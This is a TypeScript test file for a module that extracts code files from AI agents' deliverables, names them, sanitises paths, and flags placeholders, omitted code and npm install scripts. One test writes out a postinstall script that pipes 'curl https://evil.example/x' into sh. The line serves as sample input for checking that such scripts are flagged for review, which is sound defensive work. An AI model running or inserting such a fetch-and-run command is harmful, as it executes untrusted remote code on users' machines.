// Code files out of the deliveries (docs/agentic-system.md 5.4): taken out as written, named, capped, and replaced by a
// marker in what the aggregator and the deterministic merge see.
process.env.ROOK_LLM = 'canned';
process.env.ROOK_MARKET = 'sim';

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

const { attachFiles, fileGaps, installScripts, leftOut, localLinks, placeholdersIn, safePath, FILE_MAX_BYTES } = await import('../src/planner/files.ts');
/** Rook's own writer's replies the QA testers saved (2026-11-10): a 14-file Next.js app, an Express API, a 3-page site. */
const fixture = (name: string) => readFileSync(new URL(`./fixtures/${name}.selfdo.md`, import.meta.url), 'utf8');
const d = (subtask_id: string, title: string, text: string, agent_handle = 'web-dev') => ({ subtask_id, agent_handle, title, text });
const PAGE = '<!doctype html>\n<html>\n<head><title>Ozan</title></head>\n<body><h1>Ozan</h1></body>\n</html>';

test('a fenced html block becomes a file named from the line before it; the text keeps a marker in its place', () => {
  const r = attachFiles([d('s2', 'Build one-page portfolio website', `Here is the site.\n\n**portfolio.html**\n\n\`\`\`html\n${PAGE}\n\`\`\`\n\nOpen it in a browser.`)]);
  assert.deepEqual(r.files, [{ subtask_id: 's2', agent_handle: 'web-dev', name: 'portfolio.html', mime: 'text/html', text: PAGE }]);
  assert.equal(r.texts.get('s2'), 'Here is the site.\n\n**portfolio.html**\n\n[file portfolio.html, 5 lines, attached below the report]\n\nOpen it in a browser.');
  assert.deepEqual(r.unattached, []);
});

test('a delivery that is a whole HTML document is one file named from its part; an untagged fence holding one is too', () => {
  const r = attachFiles([
    d('s2', 'Build one-page portfolio website', `\n  ${PAGE}\n`),
    d('s3', 'Landing page', `Done:\n\n\`\`\`\n${PAGE}\n\`\`\``),
    d('s4', 'Intro page', `Here it is.\n\n${PAGE}\n\nI kept it short.`), // after a short note, unfenced
  ]);
  assert.deepEqual(r.files.map((f) => [f.subtask_id, f.name, f.text]), [
    ['s2', 'build-one-page-portfolio-website.html', PAGE], ['s3', 'landing-page.html', PAGE], ['s4', 'intro-page.html', PAGE],
  ]);
  assert.equal(r.texts.get('s2'), '[file build-one-page-portfolio-website.html, 5 lines, attached below the report]');
  assert.equal(r.texts.get('s4'), 'Here it is.\n\n[file intro-page.html, 5 lines, attached below the report]\n\nI kept it short.');
});

test('file names: from the fence, the line before, a first-line comment, else the part title; unique across the result', () => {
  const css = 'body {\n  margin: 0;\n}';
  const r = attachFiles([
    d('s1', 'Site', [
      '### `index.html`', '```html', PAGE, '```',
      '```css styles.css', css, '```',
      '```js', '// app.js', 'const a = 1;', 'console.log(a);', '```',
      'Uses `src/helpers.js`:', '```javascript', 'export const b = 2;', '```', // one line, but named: a file, with its folder
      '```json', '{"a": 1,', '"b": 2,', '"c": 3}', '```', // no name: from the title
    ].join('\n')),
    d('s2', 'Site', ['index.html', '```html', PAGE, '```', '```css', css, '```'].join('\n'), 'other-dev'),
  ]);
  assert.deepEqual(r.files.map((f) => [f.subtask_id, f.agent_handle, f.name, f.mime]), [
    ['s1', 'web-dev', 'index.html', 'text/html'], ['s1', 'web-dev', 'styles.css', 'text/css'], ['s1', 'web-dev', 'app.js', 'text/javascript'],
    ['s1', 'web-dev', 'src/helpers.js', 'text/javascript'], ['s1', 'web-dev', 'site.json', 'application/json'],
    ['s2', 'other-dev', 'index-2.html', 'text/html'], ['s2', 'other-dev', 'site.css', 'text/css'],
  ]);
  assert.equal(r.files[2].text, '// app.js\nconst a = 1;\nconsole.log(a);'); // the file as written
  assert.match(r.texts.get('s1')!, /\[file src\/helpers\.js, 1 line, attached below the report\]/);
});

test('known languages only; a short unnamed snippet and prose stay in the text, as does a delivery without code', () => {
  const text = ['Install it:', '```sh', 'npm i near-api-js', '```', '```text', 'a', 'b', 'c', '```', '```constructor', 'a', 'b', 'c', '```', 'More prose.'].join('\n');
  const r = attachFiles([d('s1', 'Notes', text), d('s2', 'Copy', 'Just prose.\n\nNo code here.')]);
  assert.deepEqual(r.files, []);
  assert.equal(r.texts.get('s1'), text);
  assert.equal(r.texts.get('s2'), 'Just prose.\n\nNo code here.');
  // A one-line block is no snippet when it is a page or long: minified code is still a file.
  const mini = attachFiles([d('s1', 'Page', '```html\n<!doctype html><html><body>x</body></html>\n```\n```js\n' + 'a();'.repeat(100) + '\n```')]);
  assert.deepEqual(mini.files.map((f) => f.name), ['page.html', 'page.js']);
});

test('every listed language is attached with its mime type; a fence cut short still gives its file', () => {
  const langs = [['html', 'text/html'], ['htm', 'text/html'], ['css', 'text/css'], ['js', 'text/javascript'], ['javascript', 'text/javascript'], ['ts', 'text/typescript'],
    ['typescript', 'text/typescript'], ['json', 'application/json'], ['py', 'text/x-python'], ['python', 'text/x-python'], ['sh', 'text/x-shellscript'],
    ['bash', 'text/x-shellscript'], ['svg', 'image/svg+xml'], ['xml', 'application/xml'], ['yaml', 'application/yaml'], ['yml', 'application/yaml'], ['sql', 'application/sql'],
    // A framework build: "a React landing page" came back as App.jsx, and all its code went to the aggregator.
    ['jsx', 'text/javascript'], ['tsx', 'text/typescript'], ['vue', 'text/x-vue'], ['svelte', 'text/x-svelte'], ['scss', 'text/x-scss'],
    ['sass', 'text/x-sass'], ['less', 'text/x-less'], ['php', 'application/x-httpd-php']];
  const r = attachFiles([d('s1', 'Code', langs.map(([l]) => `\`\`\`${l}\n1\n2\n3\n\`\`\``).join('\n\n'))]);
  assert.deepEqual(r.files.map((f) => f.mime), langs.map(([, m]) => m));
  const app = attachFiles([d('s1', 'React landing page', 'App.jsx\n```jsx\nexport default function App() {\n  return <h1>Hi</h1>;\n}\n```')]);
  assert.deepEqual(app.files.map((f) => [f.name, f.mime]), [['App.jsx', 'text/javascript']]);
  assert.equal(app.texts.get('s1'), 'App.jsx\n[file App.jsx, 3 lines, attached below the report]');
  const cut = attachFiles([d('s1', 'Page', `\`\`\`html\n${PAGE.slice(0, 40)}`)]);
  assert.deepEqual(cut.files.map((f) => f.text), [PAGE.slice(0, 40)]);
});

test('a reply with CRLF line endings gives the same files, named the same, with LF endings', () => {
  const css = 'body {\n  margin: 0;\n}';
  const lf = `Here is the site.\n\nindex.html\n\`\`\`html\n${PAGE}\n\`\`\`\n\nstyles.css\n\`\`\`css\n${css}\n\`\`\`\n\nOpen it.`;
  const crlf = attachFiles([d('s1', 'Site', lf.replace(/\n/g, '\r\n'))]);
  assert.deepEqual(crlf.files.map((f) => [f.name, f.text]), [['index.html', PAGE], ['styles.css', css]]);
  assert.equal(crlf.texts.get('s1'), attachFiles([d('s1', 'Site', lf)]).texts.get('s1'));
  assert.equal(crlf.texts.get('s1'), 'Here is the site.\n\nindex.html\n[file index.html, 5 lines, attached below the report]\n\nstyles.css\n[file styles.css, 3 lines, attached below the report]\n\nOpen it.');
});

test('a short block named only by the line before it never takes the name of another file: it stays in the text', () => {
  const link = '<link rel="stylesheet" href="styles.css">';
  const r = attachFiles([d('s1', 'Site', `Add this line to the <head> of your index.html:\n\`\`\`html\n${link}\n\`\`\`\n\nThe full page, index.html:\n\`\`\`html\n${PAGE}\n\`\`\``)]);
  assert.deepEqual(r.files.map((f) => [f.name, f.text]), [['index.html', PAGE]]);
  assert.equal(r.texts.get('s1'), `Add this line to the <head> of your index.html:\n\`\`\`html\n${link}\n\`\`\`\n\nThe full page, index.html:\n[file index.html, 5 lines, attached below the report]`);
  // Across parts too: the page from another agent keeps its name.
  const two = attachFiles([d('s1', 'Tweak', `In index.html, add:\n\`\`\`html\n${link}\n\`\`\``), d('s2', 'Site', `index.html\n\`\`\`html\n${PAGE}\n\`\`\``)]);
  assert.deepEqual(two.files.map((f) => [f.subtask_id, f.name]), [['s2', 'index.html']]);
  assert.equal(two.texts.get('s1'), `In index.html, add:\n\`\`\`html\n${link}\n\`\`\``);
  // Named by its fence too, a short piece of a file the same part gives whole stays in the text: one path, one file.
  const own = attachFiles([d('s1', 'Site', `For index.html:\n\`\`\`html index.html\n${link}\n\`\`\`\nThe page, index.html:\n\`\`\`html\n${PAGE}\n\`\`\``)]);
  assert.deepEqual(own.files.map((f) => [f.name, f.text]), [['index.html', PAGE]]);
  assert.match(own.texts.get('s1')!, /^For index\.html:\n```html index\.html\n<link/);
  // A short block alone under its name is still that file.
  assert.deepEqual(attachFiles([d('s1', 'Site', `\`\`\`css styles.css\nbody { margin: 0 }\n\`\`\``)]).files.map((f) => f.name), ['styles.css']);
});

test('a file over 1 MB, or past 3 MB in all, is not attached: its marker and the gaps say so, and its code is still out of the text', () => {
  const big = 'x'.repeat(FILE_MAX_BYTES + 1);
  const mb = 'y'.repeat(900 * 1024); // four of these pass 3 MB
  const fence = (name: string, body: string) => `${name}\n\`\`\`html\n${body}\n\`\`\``;
  const r = attachFiles([
    d('s1', 'Big', fence('big.html', big)),
    d('s2', 'Many', [1, 2, 3, 4].map((n) => fence(`p${n}.html`, mb)).join('\n\n')),
  ]);
  assert.deepEqual(r.files.map((f) => f.name), ['p1.html', 'p2.html', 'p3.html']);
  assert.deepEqual(r.unattached, [
    { name: 'big.html', title: 'Big', why: 'larger than 1 MB' }, { name: 'p4.html', title: 'Many', why: 'the files together pass 3 MB' },
  ]);
  assert.ok(r.texts.get('s1') === 'big.html\n[file big.html, 1 line, not attached: larger than 1 MB]', r.texts.get('s1')!.slice(0, 500));
  assert.ok(![...r.texts.values()].some((t) => t.includes('xxxx') || t.includes('yyyy')));
});

test('the deterministic merge shows markers, not code, and lists a file not attached under Gaps; /aggregate (canned) returns the files', async (t) => {
  const { cannedAggregate } = await import('../src/planner/canned.ts');
  const subtasks = [
    { id: 's1', title: 'Design brief', status: 'passed', agent_handle: 'taifoon-creative', deliverable_text: 'Clean type, lots of white space.' },
    { id: 's2', title: 'Build one-page portfolio website', status: 'passed', agent_handle: 'codex-engineer-01', deliverable_text: `index.html\n\`\`\`html\n${PAGE}\n\`\`\`` },
    { id: 's3', title: 'Big page', status: 'passed', agent_handle: 'dev-tools-agent', deliverable_text: `\`\`\`html\n${'z'.repeat(FILE_MAX_BYTES + 1)}\n\`\`\`` },
    { id: 's4', title: 'Copy', status: 'abandoned', agent_handle: 'quill-writer', deliverable_text: `\`\`\`html\n${PAGE}\n\`\`\`` }, // not merged: no file
  ];
  const md = cannedAggregate({ task_id: 't', prompt: 'make me a portfolio website like oynozan.com', subtasks });
  // assert.ok, not assert.match: a failure would print the 1 MB page
  assert.ok(md.includes('## Build one-page portfolio website\n\n_Source: `codex-engineer-01`._\n\nindex.html\n[file index.html, 5 lines, attached below the report]'), md.slice(0, 2000));
  assert.ok(md.includes('## Big page\n\n_Source: `dev-tools-agent`._\n\n[file big-page.html, 1 line, not attached: larger than 1 MB]'), md.slice(0, 2000));
  assert.ok(md.includes('## Gaps\n\n- Copy: not delivered\n- File big-page.html from "Big page": not attached, larger than 1 MB'), md.slice(0, 2000));
  assert.ok(!/<!doctype|zzzz/.test(md), md.slice(0, 2000));

  const { serve, call } = await import('../src/shared/http.ts');
  const gw = await serve('fake-gateway', {}, 0);
  process.env.MARKET_GATEWAY_URL = gw.url;
  const { start } = await import('../src/planner/index.ts');
  const planner = await start(0);
  t.after(async () => { await planner.close(); await gw.close(); });
  const agg = await call(`${planner.url}/aggregate`, { task_id: 't', prompt: 'portfolio', subtasks });
  assert.deepEqual(agg.files, [{ subtask_id: 's2', agent_handle: 'codex-engineer-01', name: 'index.html', mime: 'text/html', text: PAGE }]);
  assert.ok(agg.final_markdown === md.replace('make me a portfolio website like oynozan.com', 'portfolio'));
  const none = await call(`${planner.url}/aggregate`, { task_id: 't', prompt: 'p', subtasks: [subtasks[0]] });
  assert.deepEqual(none.files, []); // always present
});

test('a Next.js project keeps its folders and real names: app/page.tsx, components/Navbar.tsx, postcss.config.mjs', () => {
  // QA, 2026-11-10: the same reply came out as page.tsx, Navbar.tsx and "build-tidy-saas-next-js-landing-page.js", so
  // the downloaded project had no app/ folder, unresolved imports and no PostCSS config.
  const r = attachFiles([d('s1', 'Build Tidy SaaS Next.js landing page', fixture('next'), 'rook:self-do')]);
  assert.deepEqual(r.files.map((f) => [f.name, f.mime]), [
    ['package.json', 'application/json'], ['next.config.mjs', 'text/javascript'], ['tsconfig.json', 'application/json'],
    ['tailwind.config.ts', 'text/typescript'], ['postcss.config.mjs', 'text/javascript'], ['app/globals.css', 'text/css'],
    ['app/layout.tsx', 'text/typescript'], ['app/page.tsx', 'text/typescript'], ['components/Navbar.tsx', 'text/typescript'],
    ['components/Hero.tsx', 'text/typescript'], ['components/Features.tsx', 'text/typescript'], ['components/Pricing.tsx', 'text/typescript'],
    ['components/FAQ.tsx', 'text/typescript'], ['components/Footer.tsx', 'text/typescript'],
  ]);
  assert.match(r.files[7].text, /^import Navbar from "@\/components\/Navbar";/);
  const text = r.texts.get('s1')!;
  assert.match(text, /\napp\/page\.tsx\n\[file app\/page\.tsx, 19 lines, attached below the report\]\n/);
  assert.match(text, /```\nnpm install && npm run dev\n```/); // the run command stays in the text
  assert.doesNotMatch(text, /build-tidy|export default|className/);
  assert.deepEqual(fileGaps(r), []);
});

test('a README in a ```markdown fence keeps its own ```bash blocks and table; nothing of it becomes a shell script', () => {
  // QA: README.md came out as "express-todos-api.sh" (its curl examples) and the report still claimed a README.
  const r = attachFiles([d('s1', 'Express /todos API', fixture('express'), 'rook:self-do')]);
  assert.deepEqual(r.files.map((f) => [f.name, f.mime, f.text.split('\n').length]), [
    ['index.js', 'text/javascript', 89], ['package.json', 'application/json', 12], ['README.md', 'text/markdown', 44],
  ]);
  const readme = r.files[2].text;
  assert.match(readme, /^# Todo API\n/);
  assert.match(readme, /```bash\nnpm install\nnpm start\n```/);
  assert.match(readme, /\| GET {6}\| \/todos {8}\|/);
  assert.match(readme, /Data is stored in memory and resets when the server restarts\.$/);
  assert.match(r.texts.get('s1')!, /\[file README\.md, 44 lines, attached below the report\]\n\nThe API uses `express\.json\(\)`/);
  // The 3-page site still gives exactly its four files.
  assert.deepEqual(attachFiles([d('s1', 'Site', fixture('static3'))]).files.map((f) => f.name), ['index.html', 'about.html', 'contact.html', 'styles.css']);
});

test('fences pair: a close is a run of the same character at least as long; an inner fence with a language closes first', () => {
  const md = (open: string, close: string) => [
    'README.md', `${open}markdown`, '# App', '', '```sh', 'npm start', '```', '', '~~~text', 'tilde block', '~~~', '', 'Done.', close, 'After.',
  ].join('\n');
  for (const [open, close] of [['```', '```'], ['````', '````'], ['~~~', '~~~'], ['~~~~', '~~~~~']]) {
    const r = attachFiles([d('s1', 'App', md(open, close))]);
    assert.deepEqual(r.files.map((f) => f.name), ['README.md'], open);
    assert.match(r.files[0].text, /^# App\n\n```sh\nnpm start\n```\n\n~~~text\ntilde block\n~~~\n\nDone\.$/, open);
    assert.equal(r.texts.get('s1'), 'README.md\n[file README.md, 11 lines, attached below the report]\nAfter.', open);
  }
  // A shorter run does not close a longer fence; a bare inner fence can't be told from the close, so it closes it.
  const r = attachFiles([d('s1', 'App', 'a.js\n````js\nconst s = `\n```\n`;\n````\ntail')]);
  assert.deepEqual(r.files.map((f) => f.text), ['const s = `\n```\n`;']);
  const bare = attachFiles([d('s1', 'App', 'README.md\n```markdown\n# App\n\n```\nnpm start\n```\n```')]);
  assert.deepEqual(bare.files.map((f) => f.text), ['# App\n']);
});

test('paths are made safe: no drive, no absolute or ".." part, "/" separators, no "./"', () => {
  for (const [raw, want] of [['/app/page.tsx', 'app/page.tsx'], ['../shared/a.ts', 'shared/a.ts'], ['C:\\proj\\src\\a.ts', 'proj/src/a.ts'],
    ['./src/./lib//b.ts', 'src/lib/b.ts'], ['~/x/.env.example', 'x/.env.example'], ['app/(site)/[slug]/page.tsx', 'app/(site)/[slug]/page.tsx']] as const) {
    assert.equal(safePath(raw), want, raw);
  }
  for (const bad of ['..', '/', 'C:', 'a/b?.js', 'x'.repeat(301)]) assert.equal(safePath(bad), undefined, bad);
  const r = attachFiles([d('s1', 'App', [
    '**/etc/../app/api/route.ts**', '```ts', 'export async function GET() {', '  return Response.json([]);', '}', '```',
    '```js', '// ..\\scripts\\build.mjs', 'import fs from "node:fs";', 'fs.mkdirSync("dist");', '```',
  ].join('\n'))]);
  assert.deepEqual(r.files.map((f) => f.name), ['etc/app/api/route.ts', 'scripts/build.mjs']);
});

test("a path comes from the fence's words, a first-line comment or the line before (alone or a mention of its kind)", () => {
  const three = ['a', 'b', 'c'].join('\n');
  const r = attachFiles([d('s1', 'App', [
    '```tsx app/(marketing)/page.tsx', three, '```',
    '```json:package.json', '{"name": "x"}', '```',
    '```js title="next.config.mjs"', three, '```',
    '```css', '/* css/site.css */', 'body {}', '```',
    '```html', '<!-- pages/about.html -->', '<p>About</p>', '```',
    '```sh', '# scripts/setup.sh', 'npm ci', '```',
    '1. **`components/Hero.tsx`**:', '```tsx', three, '```',
    'File: .env.example', '```', 'PORT=3000', '```', // an untagged fence takes its kind from a path line
    'Now the page component (it goes in `pages/blog/[slug].tsx`):', '```typescript', three, '```', // a mention of its kind
    'Built with Next.js:', '```js', three, '```', // a product, not a file
  ].join('\n'))]);
  assert.deepEqual(r.files.map((f) => [f.name, f.mime]), [
    ['app/(marketing)/page.tsx', 'text/typescript'], ['package.json', 'application/json'], ['next.config.mjs', 'text/javascript'],
    ['css/site.css', 'text/css'], ['pages/about.html', 'text/html'], ['scripts/setup.sh', 'text/x-shellscript'], ['components/Hero.tsx', 'text/typescript'],
    ['.env.example', 'text/plain'], ['pages/blog/[slug].tsx', 'text/typescript'], ['app.js', 'text/javascript'],
  ]);
});

test('project files of every new kind are attached by name; prose formats only when named', () => {
  const block = (name: string, lang: string) => `${name}\n\`\`\`${lang}\nline 1\nline 2\nline 3\n\`\`\``;
  const named = [['server.mjs', 'js'], ['legacy.cjs', 'javascript'], ['README.md', 'markdown'], ['docs/setup.mdx', 'mdx'], ['pyproject.toml', 'toml'],
    ['.env.example', 'env'], ['Dockerfile', 'dockerfile'], ['prisma/schema.prisma', 'prisma'], ['.gitignore', 'gitignore'], ['.dockerignore', ''],
    ['requirements.txt', 'text'], ['setup.cfg', 'ini'], ['nginx/site.conf', 'nginx'], ['schema.graphql', 'graphql'], ['LICENSE', ''], ['.prettierrc', 'json']];
  const r = attachFiles([d('s1', 'App', named.map(([n, l]) => block(n, l)).join('\n\n'))]);
  assert.deepEqual(r.files.map((f) => [f.name, f.mime]), [
    ['server.mjs', 'text/javascript'], ['legacy.cjs', 'text/javascript'], ['README.md', 'text/markdown'], ['docs/setup.mdx', 'text/markdown'],
    ['pyproject.toml', 'application/toml'], ['.env.example', 'text/plain'], ['Dockerfile', 'text/plain'], ['prisma/schema.prisma', 'text/plain'],
    ['.gitignore', 'text/plain'], ['.dockerignore', 'text/plain'], ['requirements.txt', 'text/plain'], ['setup.cfg', 'text/plain'],
    ['nginx/site.conf', 'text/plain'], ['schema.graphql', 'application/graphql'], ['LICENSE', 'text/plain'], ['.prettierrc', 'application/json'],
  ]);
  // A ```markdown or ```text block with no name is writing for the report (a post, sample output), not a file.
  const prose = ['Here is the post:', '```markdown', '# Launch day', '', 'We shipped.', '```', '```text', 'a', 'b', 'c', '```'].join('\n');
  assert.deepEqual(attachFiles([d('s1', 'Post', prose)]).files, []);
});

test('a nameless block is named by its content when that is plain, by the one file a page loads, else by its part', () => {
  const r = attachFiles([d('s1', 'Build Tidy SaaS Next.js landing page', [
    '```json', '{', '  "name": "tidy",', '  "scripts": { "dev": "next dev" }', '}', '```',
    '```json', '{', '  "compilerOptions": { "strict": true }', '}', '```',
    '```js', '/** @type {import(\'next\').NextConfig} */', 'const nextConfig = {};', 'export default nextConfig;', '```',
    '```js', 'module.exports = {', '  plugins: { tailwindcss: {}, autoprefixer: {} },', '};', '```',
    '```dockerfile', 'FROM node:20', 'COPY . .', 'CMD ["npm", "start"]', '```',
    '```gitignore', 'node_modules', '.next', '.env', '```',
    '```json', '{', '  "a": 1', '}', '```',
  ].join('\n'))]);
  assert.deepEqual(r.files.map((f) => f.name), ['package.json', 'tsconfig.json', 'next.config.mjs', 'postcss.config.js', 'Dockerfile', '.gitignore',
    'build-tidy-saas-next-js-landing-page.json']);
  const page = '<!doctype html>\n<html><head><link rel="stylesheet" href="css/site.css"><link rel="icon" href="favicon.ico"></head>\n<body><script src="https://cdn.example/x.js"></script></body></html>';
  const site = attachFiles([d('s1', 'Site', `index.html\n\`\`\`html\n${page}\n\`\`\`\n\n\`\`\`css\nbody {\n  margin: 0;\n}\n\`\`\``)]);
  assert.deepEqual(site.files.map((f) => f.name), ['index.html', 'css/site.css']);
});

test('the same path twice in one part is one file: its last whole version, and a note where the earlier one was', () => {
  const v1 = '<!doctype html>\n<html><body>v1</body></html>', v2 = '<!doctype html>\n<html><body>v2</body></html>';
  const r = attachFiles([
    d('s1', 'Site', `First try, index.html:\n\`\`\`html\n${v1}\n\`\`\`\n\nFixed, index.html:\n\`\`\`html\n${v2}\n\`\`\``),
    d('s2', 'Other site', `index.html\n\`\`\`html\n${v1}\n\`\`\``), // another part's page keeps its own name
  ]);
  assert.deepEqual(r.files.map((f) => [f.subtask_id, f.name, f.text]), [['s1', 'index.html', v2], ['s2', 'index-2.html', v1]]);
  assert.equal(r.texts.get('s1'), 'First try, index.html:\n[file index.html, 2 lines, not attached: a later version of it in this part is attached]\n\nFixed, index.html:\n[file index.html, 2 lines, attached below the report]');
  assert.deepEqual(r.unattached, []); // nothing is missing
  // Paths compare without case, as a download folder does.
  assert.deepEqual(attachFiles([d('s1', 'A', 'App/Page.tsx\n```tsx\n1\n2\n3\n```'), d('s2', 'B', 'app/page.tsx\n```tsx\n1\n2\n3\n```')]).files.map((f) => f.name),
    ['App/Page.tsx', 'app/page-2.tsx']);
});

test('placeholders the user must replace are found in the text and the files, and listed as gaps', () => {
  assert.deepEqual(placeholdersIn('Hi, I am [Your Name]. Mail [your email] or call [PHONE NUMBER]. Clients: [Company Name], [Add testimonial here], [TBD]. Lorem ipsum dolor.'),
    ['[Your Name]', '[your email]', '[PHONE NUMBER]', '[Company Name]', '[Add testimonial here]', '[TBD]', 'lorem ipsum filler text']);
  // Not placeholders: links, images, indices, task boxes, footnotes, quoted lists, TOML sections, Rook's own markers.
  assert.deepEqual(placeholdersIn('[Docs](https://x.dev) ![Logo](logo.png) tiers[0] [ ] [x] [1] ["Name", "Email"] [package] [file index.html, 5 lines, attached below the report] {[name]: 1} [Link][ref]'), []);
  const page = '<!doctype html>\n<html><body><h1>[Your name]</h1><a href="mailto:[your@email.com]">Mail</a></body></html>';
  const r = attachFiles([d('s1', 'Build portfolio', `Fill in [Your phone] too.\n\nindex.html\n\`\`\`html\n${page}\n\`\`\``)]);
  assert.deepEqual(r.placeholders, [
    { title: 'Build portfolio', found: ['[Your phone]'] }, { title: 'Build portfolio', name: 'index.html', found: ['[Your name]', '[your@email.com]'] },
  ]);
  assert.deepEqual(fileGaps(r), ['Placeholders to replace in "Build portfolio": [Your phone]', 'Placeholders to replace in index.html from "Build portfolio": [Your name], [your@email.com]']);
  const many = Array.from({ length: 10 }, (_, i) => `[Your project ${i + 1} link]`).join(' ');
  assert.match(fileGaps(attachFiles([d('s1', 'P', many)]))[0], /\[Your project 8 link\] and 2 more$/);
});

test('code left out is found in a file ("rest of the code", "... existing code ...", a bare ellipsis), not in honest prose', () => {
  for (const [text, name] of [['<div>\n<!-- rest of the page -->\n</div>', 'index.html'], ['function a() {\n  // ... existing code ...\n}', 'a.ts'],
    ['x();\n// ...\ny();', 'app.js'], ['<ul>\n  {/* ... */}\n</ul>', 'List.tsx'], ['def f():\n    # TODO: implement\n    pass', 'main.py'],
    ['.a { color: red }\n/* other styles unchanged */', 'site.css'], ['## Setup\n\nCode omitted for brevity.', 'README.md']] as const) {
    assert.ok(leftOut(text, name), `${name}: ${text}`);
  }
  for (const [text, name] of [['const all = [...a, ...b];\nfunction f(...args) {}', 'a.js'], ['The rest of the code lives in src/.', 'README.md'],
    ['class P(Protocol):\n    def f(self) -> int:\n        ...', 'p.py'], ['Wait...\n\n...\n\nthen go.', 'notes.txt']] as const) {
    assert.equal(leftOut(text, name), undefined, `${name}: ${text}`);
  }
  assert.equal(leftOut('x();\n// ... existing code ...\ny();', 'app.js'), '// ... existing code ...');
});

test('install scripts in a delivered package.json are found (and listed for review); other scripts are not', () => {
  const pkg = JSON.stringify({ name: 'x', scripts: { dev: 'next dev', postinstall: 'curl https://evil.example/x | sh', prepare: 'husky' } }, null, 2);
  assert.deepEqual(installScripts([{ name: 'package.json', text: pkg }, { name: 'web/package.json', text: '{"scripts": {"preinstall": "node a.js",}}' }, { name: 'a.json', text: pkg }]), [
    { name: 'package.json', script: 'postinstall', command: 'curl https://evil.example/x | sh' }, { name: 'package.json', script: 'prepare', command: 'husky' },
    { name: 'web/package.json', script: 'preinstall', command: 'node a.js' }, // not valid JSON: still read
  ]);
  const r = attachFiles([d('s1', 'API', `package.json\n\`\`\`json\n${pkg}\n\`\`\``)]);
  assert.deepEqual(fileGaps(r), [
    'package.json runs a script on npm install ("postinstall": "curl https://evil.example/x | sh"): review it before running npm install',
    'package.json runs a script on npm install ("prepare": "husky"): review it before running npm install',
  ]);
  assert.deepEqual(installScripts([{ name: 'package.json', text: '{"scripts": {"start": "node index.js"}}' }]), []);
});

test('a page loads its stylesheets, scripts and frames from its own folder; links elsewhere and page links do not count', () => {
  const html = `<link rel="stylesheet" href="styles.css"><link href='../shared/base.css' rel=stylesheet><script src=js/app.js?v=2></script>
<script src="https://cdn.example/x.js"></script><script src="//cdn.example/y.js"></script><link rel="icon" href="data:,">
<iframe src="/embed/map.html#top"></iframe><a href="about.html">About</a><img src="hero.png"><link href="{{ url }}">
<link href="../../../escape.css"><script src="my%20file.js"></script>`;
  assert.deepEqual(localLinks(html, 'site/pages/index.html'), ['site/pages/styles.css', 'site/shared/base.css', 'site/pages/js/app.js', 'embed/map.html', 'site/pages/my file.js']);
  assert.deepEqual(localLinks('<<<<script src="a.js">', 'i.html'), ['a.js']); // one scan, any input
});

test('canned self-do gives an edit its files back whole and writes each files-criterion path, so the files check passes offline', async () => {
  const { cannedSelfDo, cannedAggregate } = await import('../src/planner/canned.ts');
  const { evaluate } = await import('../src/evaluator/index.ts');
  const page = '<!doctype html>\n<html><body><pre>```\nx\n```</pre></body></html>';
  const criteria = [{ id: 'c1', kind: 'files' as const, description: 'd', spec: { paths: ['index.html', 'app/page.tsx', 'package.json', 'README.md'] } }];
  const text = cannedSelfDo('Rename\n\nChange the name.', criteria, [{ path: 'index.html', text: page }]);
  const r = attachFiles([d('s1', 'Rename', text, 'rook:self-do')]);
  assert.deepEqual(r.files.map((f) => f.name), ['app/page.tsx', 'package.json', 'README.md', 'index.html']);
  assert.equal(r.files[3].text, page); // as given, its own fences kept inside a longer one
  assert.match(r.files[0].text, /^\/\/ SIMULATED app\/page\.tsx/);
  const ev = await evaluate({ task_id: 't', subtask_id: 's1', brief: 'Rename', criteria, deliverable: { text, parts: [] }, peers: [] });
  assert.equal(ev.verdict, 'pass', JSON.stringify(ev.results));

  // The deterministic merge's gaps name the placeholders to replace and the install scripts to review.
  const md = cannedAggregate({ task_id: 't', prompt: 'portfolio', subtasks: [
    { id: 's1', title: 'Build portfolio', status: 'passed', agent_handle: 'web-dev', deliverable_text: 'index.html\n```html\n<!doctype html>\n<html><body>[Your name]</body></html>\n```' },
    { id: 's2', title: 'API', status: 'passed', agent_handle: 'api-dev', deliverable_text: 'package.json\n```json\n{"name": "a", "scripts": {"postinstall": "node x.js"}}\n```' },
  ] });
  assert.ok(md.endsWith('## Gaps\n\n- Placeholders to replace in index.html from "Build portfolio": [Your name]\n- package.json runs a script on npm install ("postinstall": "node x.js"): review it before running npm install\n'), md);
});

test('POST /self-do (canned) takes an edit\'s files and gives back sources, an empty list without tools', async (t) => {
  const { serve, call } = await import('../src/shared/http.ts');
  const gw = await serve('fake-gateway', {}, 0);
  process.env.MARKET_GATEWAY_URL = gw.url;
  const { start } = await import('../src/planner/index.ts');
  const planner = await start(0);
  t.after(async () => { await planner.close(); await gw.close(); });
  const out = await call<{ text: string; sources: unknown[]; llm_calls: unknown[] }>(`${planner.url}/self-do`, {
    task_id: 't', subtask_id: 's1', brief: 'Rename\n\nChange it.', criteria: [], files: [{ path: 'styles.css', text: 'h1 { color: navy; }' }],
  });
  assert.deepEqual([out.sources, out.llm_calls], [[], []]);
  assert.match(out.text, /\nstyles\.css\n```css\nh1 \{ color: navy; \}\n```\n/);
});

test("an agent's hostile text is read in linear time: long info strings, first lines, config blocks and fence runs", async () => {
  const { fenceFor } = await import('../src/planner/files.ts');
  const t0 = Date.now();
  assert.equal(fenceFor('```\n'.repeat(300_000) + '`````'), '``````'); // no spread of 300k arguments
  const r = attachFiles([d('s1', 'Hostile', [
    `\`\`\`js ${'['.repeat(400_000)}`, 'a', 'b', 'c', '```',
    '```html', `<!--${' '.repeat(150_000)}a${' '.repeat(150_000)}b`, 'a', 'b', '```',
    '```js', `${'\n'.repeat(200_000)}x = 1;`, 'plugins: {'.repeat(50_000), '```',
  ].join('\n'))]);
  assert.equal(r.files.length, 3);
  assert.equal(leftOut(`x();\n${' '.repeat(300_000)}y`, 'a.js'), undefined);
  assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`);
});
